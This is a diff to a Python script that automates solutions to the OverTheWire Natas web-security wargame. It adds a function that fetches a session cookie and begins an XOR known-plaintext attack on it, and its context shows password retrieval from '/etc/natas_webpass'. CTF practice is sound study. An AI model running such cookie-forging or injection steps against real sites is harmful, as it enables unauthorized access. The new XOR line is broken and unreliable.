@@ -29,6 +29,11 @@ def post(username, password, url, headers, data):
         post = s.post(url, headers=headers, data=data)
     return(post.text)
 
+def getCookies(username, password, url, headers):
+    with requests.Session() as s:
+        post = s.post(url, headers=headers)
+    return(post)
+
 def eraseFile():
     filename = 'flags.txt'
     file = open(filename, 'w')
@@ -53,6 +58,7 @@ def cleanFlagFile():
     return()
 
 def cleanFlag(password):
+    # Carriage Returns were messing up the base64 encoding
     password = password.replace('\n', '')
     return(password)
 
@@ -243,10 +249,28 @@ def natas10(natas10Password):
         if '/etc/natas_webpass' in response[0:1100]:
             natas11Password = response[1016:1048]
             break
-    #natas11Password = response
     print('Password for the next level is: ' + natas11Password)
     natas11Password = cleanFlag(natas11Password)
     return(natas11Password)
+
+def natas11(natas11Password):
+    username = 'natas11'
+    auth_64 = encodeCreds(username, natas11Password)
+    url = 'http://natas11.natas.labs.overthewire.org'
+    headers = {
+        'Authorization' : 'Basic ' + auth_64
+    }
+    response = getCookies(username, natas11Password, url, headers)
+    cookie = response.cookies['data']
+    cookie = cleanFlag(cookie)
+    cookie = cookie.replace('%3D', '=')
+    print(cookie)
+    dataToXOR = {
+        "showpassword" : "no",
+        "bgcolor" : "#fffff"
+        }
+    cookie = base64.b64decode(cookie)
+    return ''.join(chr(str(a) ^ str(b)) for a,b in zip(cookie, dataToXOR))
 
 def main():
     os.system('clear')
@@ -274,6 +298,7 @@ def main():
     writeToFlagFile(natas10Password, '10')
     natas11Password = natas10(natas10Password)
     writeToFlagFile(natas11Password, '11')
+    print(natas11(natas11Password))
 
     cleanFlagFile()
 
